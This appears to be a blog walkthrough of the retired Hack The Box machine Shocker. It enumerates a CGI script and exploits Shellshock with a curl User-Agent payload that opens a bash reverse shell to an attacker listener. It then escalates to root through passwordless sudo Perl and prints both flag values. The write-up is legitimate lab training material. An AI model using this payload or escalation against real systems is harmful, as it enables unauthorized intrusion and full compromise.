+++
title = "HTB — Shocker"
date = "2026-05-05T00:00:00-05:00"
tags = ["htb", "linux", "web", "cgi", "shellshock", "gobuster", "sudo", "perl", "retired"]
description = "Walkthrough of Hack The Box Shocker — directory busting to find a CGI script, exploiting Shellshock (CVE-2014-6271) via a malicious User-Agent header, and escalating to root through a NOPASSWD sudo entry for Perl."
draft = false
+++

## Machine Info

| Field       | Value                              |
|-------------|------------------------------------|
| Name        | Shocker                            |
| Platform    | Hack The Box                       |
| Difficulty  | Easy                               |
| OS          | Linux (Ubuntu Xenial 16.04)        |
| Release     | 2017                               |
| Tags        | Web, CGI, Shellshock, Sudo, Perl   |

Shocker is a classic easy Linux box built around CVE-2014-6271, better known as Shellshock. The name is a direct hint. The path is: find a CGI script hidden in `/cgi-bin/`, craft a Shellshock payload in the User-Agent header, catch a reverse shell, then abuse a passwordless `sudo` entry for Perl to escalate to root.

---

## 1. Initial Enumeration (nmap)

```bash
nmap -sC -sV -p- -oA nmap/shocker -vvv 10.10.10.56
```

Relevant output:

```
PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports:

- **80/tcp** — Apache 2.4.18 on Ubuntu Xenial (16.04)
- **2222/tcp** — SSH on a non-standard port, not relevant to the intended attack path

The Apache version fingerprints to Ubuntu Xenial. The index page at port 80 is a static HTML file with no interesting content or links.

---

## 2. Directory Enumeration — Finding cgi-bin

The index page is a dead end. Run gobuster to find hidden paths. The key flag here is `-f`, which appends a trailing slash to every request — necessary because this Apache installation returns 404 (not 301) for directories without the slash, which means a standard gobuster run misses them entirely.

```bash
gobuster dir -f -u http://10.10.10.56/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -o gobuster-root.txt -t 50
```

Key result:

```
/cgi-bin/ (Status: 403)
```

The 403 response confirms the directory exists but is not browsable. This is the standard Apache CGI directory — scripts placed here are executed server-side rather than served as static files. The machine name "Shocker" and the presence of `cgi-bin` point directly at Shellshock.

Next, enumerate files inside `/cgi-bin/` with a `.sh` extension:

```bash
gobuster dir -u http://10.10.10.56/cgi-bin/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -x sh -o gobuster-cgi.txt -t 50
```

Result:

```
/cgi-bin/user.sh (Status: 200)
```

---

## 3. Confirming the CGI Script

```bash
curl -v http://10.10.10.56/cgi-bin/user.sh
```

Response:

```
< HTTP/1.1 200 OK
< Content-Type: text/x-sh

Content-Type: text/plain

Just an uptime test script

 06:46:26 up 19:15, 0 users, load average: 0.00, 0.00, 0.00
```

The script is executing on the server and returning dynamic output (live uptime). This confirms it is a CGI script running under Apache. Shellshock works against CGI scripts because the vulnerability lies in how Bash parses environment variables — and Apache passes HTTP headers as environment variables to CGI processes.

---

## 4. Shellshock Exploitation (CVE-2014-6271)

Shellshock is a vulnerability in Bash where a specially crafted environment variable containing a function definition followed by arbitrary commands causes Bash to execute those commands when it starts. The payload format is:

```
() { :;}; <command>
```

Apache passes HTTP headers — including `User-Agent` — as environment variables to CGI scripts. If the CGI script is executed by a vulnerable version of Bash, the injected command runs.

The `echo;` after the function definition is required to insert a blank line between the HTTP headers and body in the response. Without it, the server returns a 500 Internal Server Error because the HTTP response is malformed.

Start a listener:

```bash
nc -lvnp 4444
```

Send the Shellshock payload via the User-Agent header:

```bash
curl -H "User-Agent: () { :;}; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'" \
  http://10.10.10.56/cgi-bin/user.sh
```

The listener receives a connection:

```
connect to [10.10.14.x] from (UNKNOWN) [10.10.10.56] 52340
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$
```

Shell as `shelly`.

---

## 5. User Flag

```bash
cat /home/shelly/user.txt
```

```
2ec24b67e957cd63b528b2c93a871c5e
```

---

## 6. Privilege Escalation — sudo Perl

Check sudo permissions:

```bash
sudo -l
```

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Perl can execute arbitrary shell commands. Since it runs as root with no password required, escalation is a one-liner:

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 7. Root Flag

```bash
cat /root/root.txt
```

```
52c2715605d70c7619030560dc1ca467
```

---

## Summary of Flags

| Flag     | Path                    | Value                              |
|----------|-------------------------|------------------------------------|
| user.txt | `/home/shelly/user.txt` | `2ec24b67e957cd63b528b2c93a871c5e` |
| root.txt | `/root/root.txt`        | `52c2715605d70c7619030560dc1ca467` |

---

## Full Attack Chain

```
nmap
  -> 80/tcp: Apache 2.4.18 (Ubuntu Xenial)
      -> gobuster -f -> /cgi-bin/ (403)
          -> gobuster -x sh -> /cgi-bin/user.sh (200)
              -> curl -> uptime output (confirmed CGI execution under Bash)
                  -> Shellshock via User-Agent header
                      -> nc -lvnp 4444 -> reverse shell as shelly
                          -> user.txt
                              -> sudo -l -> (root) NOPASSWD: /usr/bin/perl
                                  -> sudo perl -e 'exec "/bin/sh"' -> root shell
                                      -> root.txt
```

---

## Key Takeaways

- **The `-f` flag in gobuster is non-obvious but important.** Apache CGI directories return 404 without the trailing slash rather than 301, which causes standard gobuster runs to miss them silently. Always test with `-f` when the target is Apache.
- **The machine name is a hint.** "Shocker" + `/cgi-bin/` is an immediate pointer to Shellshock. Recognising these signals saves time during enumeration.
- **Shellshock requires the `echo;` separator.** Without the blank line between function definition and body, the HTTP response is malformed and the server returns 500. The payload fails silently without it.
- **NOPASSWD sudo entries for interpreters are root.** Any language runtime in a sudo entry without a password (`perl`, `python`, `ruby`, `awk`, etc.) is an unconditional path to root via `exec` or `system`. GTFOBins documents all of them.
